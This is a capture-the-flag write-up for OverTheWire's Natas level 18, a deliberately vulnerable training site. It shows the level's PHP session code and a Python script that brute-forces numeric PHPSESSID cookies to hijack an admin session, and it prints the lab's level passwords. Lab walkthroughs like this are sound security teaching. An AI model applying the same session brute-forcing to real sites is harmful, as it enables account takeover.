# Natas Level 18
```bash
Username: natas18
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
URL:      http://natas18.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas18.png" />
    <div align="center">Natas 18</div>
</figure>

And from the "View sourcecode" link we can extract the following script:
```php
$maxid = 640; // 640 should be enough for everyone 

function isValidAdminLogin() { /* {{{ */ 
    if($_REQUEST["username"] == "admin") { 
        /* This method of authentication appears to be unsafe and has been disabled for now. */ 
        //return 1; 
    } 

    return 0; 
} 
/* }}} */ 
function isValidID($id) { /* {{{ */ 
    return is_numeric($id); 
} 
/* }}} */ 
function createID($user) { /* {{{ */ 
    global $maxid; 
    return rand(1, $maxid); 
} 
/* }}} */ 
function debug($msg) { /* {{{ */ 
    if(array_key_exists("debug", $_GET)) { 
        print "DEBUG: $msg<br>"; 
    } 
} 
/* }}} */ 
function my_session_start() { /* {{{ */ 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
        if(!session_start()) { 
            debug("Session start failed"); 
            return false; 
        } else { 
            debug("Session start ok"); 
            if(!array_key_exists("admin", $_SESSION)) { 
                debug("Session was old: admin flag set"); 
                $_SESSION["admin"] = 0; // backwards compatible, secure 
            } 
            return true; 
        } 
    } 

    return false; 
} 
/* }}} */ 
function print_credentials() { /* {{{ */ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
        print "You are an admin. The credentials for the next level are:<br>"; 
        print "<pre>Username: natas19\n"; 
        print "Password: <censored></pre>"; 
    } else { 
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
} 
/* }}} */ 

$showform = true; 
if(my_session_start()) { 
    print_credentials(); 
    $showform = false; 
} else { 
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) { 
        session_id(createID($_REQUEST["username"])); 
        session_start(); 
        $_SESSION["admin"] = isValidAdminLogin(); 
        debug("New session started"); 
        $showform = false; 
        print_credentials(); 
    } 
}
```

Upon login, the function *my_session_start* is being called.

It first tries to load active session (from cookie),

It checks for PHPSESSID cookie and validates it (with *isValidID* which check for numeric value), and after that starts the session. if value "admin" is found in the session variables, admin flag is being set.

If no cookie found, it creates new session (with fresh session id).

We need somehow to set the admin flag (or guess the PHPSESSID of the admin). We can brute force PHPSESSIDs with this python code:
```python
import requests
import string

URL = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

phpsessid = 0

while True:
    cookie = {'PHPSESSID': str(phpsessid)}

    r = requests.get(URL, auth=auth, cookies=cookie)

    if 'regular' in r.text:
        phpsessid += 1
    else:
        break

print r.text
```

After few seconds, we get this result:
```bash
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We got the password for the next level: **4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs**